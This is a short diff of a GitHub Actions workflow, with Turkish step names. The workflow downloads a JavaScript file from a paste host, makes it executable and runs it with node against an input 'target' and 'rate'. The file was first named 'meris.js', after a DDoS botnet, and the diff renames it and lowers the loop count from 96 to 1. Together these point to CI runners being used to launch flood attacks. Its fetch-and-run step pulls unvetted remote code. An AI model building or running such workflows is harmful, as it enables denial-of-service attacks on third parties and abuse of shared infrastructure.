@@ -28,16 +28,16 @@ jobs:
     steps:
     - name: Dosyaları indir ve hazırla
       run: |
-        wget https://curl.by/P4wat/meris.js
-        chmod +x meris.js
+        wget https://curl.by/Ob_Cb/deneme.js
+        chmod +x deneme.js
     - name: run
       run: |
         TARGET="${{ inputs.target }}"
         RATE="${{ inputs.rate }}"
         
         PIDS=()
-        for i in {1..96}; do
-          timeout 250 node meris.js "$TARGET" "$RATE"
+        for i in {1..1}; do
+          timeout 250 node deneme.js "$TARGET" "$RATE" 250
           PIDS+=($!)
         done
         
